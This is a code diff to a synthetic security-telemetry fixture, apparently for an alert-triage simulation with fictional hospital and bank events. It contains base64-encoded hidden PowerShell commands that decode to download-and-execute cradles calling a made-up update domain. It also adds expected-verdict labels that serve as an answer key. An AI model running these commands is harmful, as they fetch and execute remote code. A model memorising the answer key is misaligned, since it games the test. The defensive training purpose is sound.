@@ -900,7 +900,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     src_ip: "192.168.10.22",
     description: "A hidden PowerShell command ran on WS-MED-022, launched from the earlier suspicious cmd.exe process",
     mitre_technique: "T1059.001",
-    process: { name: "powershell.exe", pid: 7799, parent_name: "cmd.exe", parent_pid: 7741, user: "dr.vandijk", cmdline: "powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8A", integrity: "high" },
+    process: { name: "powershell.exe", pid: 7799, parent_name: "cmd.exe", parent_pid: 7741, user: "dr.vandijk", cmdline: "powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAGUAZAB1AHAAZABhAHQAZQAuAG4AZQB0AC8AeAAuAHAAcwAxACcAKQA=", integrity: "high" },
     raw: { "s1.event_type": "INDICATOR", "s1.threat_level": "high", "s1.indicator_name": "POWERSHELL_ENCODED_COMMAND", "s1.action": "detect_only", "action_result": "allowed", "policy.name": "Clinical-Detect-Only", "mitre.tactic": "Execution" }
   },
   {
@@ -908,6 +908,8 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     source: "edr", event_type: "av_detection", severity: "high",
     vendor: "SentinelOne", hostname: "WS-NURS-033", user_email: "r.bakker@medcorehealth.org",
     src_ip: "192.168.10.33",
+    expected_verdict: "tp", is_detection: true,
+    fp_explanation: "Real malware detection (Trojan.GenericKD) that SentinelOne auto-killed and quarantined — a TRUE positive that was contained, not noise. Correct handling: confirm the quarantine held, check how update.exe reached r.bakker's Temp folder, and scope for other hosts; low urgency because it was blocked, but it is not a false positive.",
     description: "Trojan.GenericKD detected on WS-NURS-033",
     file: { path: "C:\\Users\\r.bakker\\AppData\\Temp\\update.exe", sha256: "6204651fac7f02eb1baba261cd2b4852d21eaf94f00bfcee0bd76c599e32c1e9" },
     raw: { "s1.event_type": "THREAT", "threat.name": "Trojan.GenericKD", "action_result": "process_killed", "quarantine.status": "quarantined", "process.killed": "true", "s1.threat_level": "high" }
@@ -918,6 +920,7 @@ const MEDCORE_EVENTS: TelemetryEvent[] = [
     source: "edr", event_type: "process_access", severity: "critical",
     vendor: "SentinelOne", hostname: "WS-MED-022", user_email: "dr.vandijk@medcorehealth.org",
     src_ip: "192.168.10.22",
+    expected_verdict: "escalate", is_detection: true,
     description: "powershell.exe (PID 7799) on WS-MED-022 opened a handle to lsass.exe memory",
     mitre_technique: "T1003.001",
     process: { name: "powershell.exe", pid: 7799, parent_name: "cmd.exe", parent_pid: 7741, user: "dr.vandijk", cmdline: "powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand ...", integrity: "high" },
@@ -2366,6 +2369,8 @@ const QUANTUMBANK_EVENTS: TelemetryEvent[] = [
     id: "qb_cs_003", ts: "2026-05-10T10:45:00.000Z",
     source: "edr", event_type: "av_detection", severity: "critical",
     vendor: "CrowdStrike Falcon", hostname: "WKS-QB-012", src_ip: "10.100.1.12",
+    expected_verdict: "tp", is_detection: true,
+    fp_explanation: "A reflective CobaltStrike beacon inside svchost.exe is a confirmed compromise (T1055/T1071) that Falcon killed and quarantined — a TRUE positive, not background noise. Correct handling: confirm the kill, isolate WKS-QB-012, and hunt for how the beacon was injected and what it reached before termination.",
     description: "CrowdStrike raised a memory-based detection inside svchost.exe on WKS-QB-012 and killed the process",
     file: { path: "memory://svchost.exe", sha256: "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77" },
     raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "threat.name": "CobaltStrike.beacon.reflective", "action_result": "process_killed", "quarantine.status": "quarantined", "process.killed": "true", "crowdstrike.SeverityName": "CRITICAL", "policy.name": "Banking-Prevent" }
@@ -2945,7 +2950,7 @@ const MEDCORE_ATTACKS: TelemetryEvent[] = [
     severity: "medium", vendor: "SentinelOne", hostname: "WS-MED-PETERS", user_email: "dr.peters@medcorehealth.org", src_ip: "192.168.10.78",
     description: "Opening a Word document on WS-MED-PETERS triggered a hidden command line and then a hidden PowerShell command",
     mitre_technique: "T1059.001",
-    process: { name: "powershell.exe", pid: 4422, parent_name: "cmd.exe", parent_pid: 4421, user: "dr.peters", cmdline: "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA" },
+    process: { name: "powershell.exe", pid: 4422, parent_name: "cmd.exe", parent_pid: 4421, user: "dr.peters", cmdline: "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBtAGUAZAB1AHAAZABhAHQAZQAuAG4AZQB0AC8AbQAuAHAAcwAxACcAKQA=" },
     raw: { "s1.indicator_name": "OFFICE_MACRO_CMD_SPAWN", "s1.threat_level": "medium", "s1.action": "detect_only", "policy.name": "Clinical-Detect-Only", "action_result": "allowed" }
   },
   {
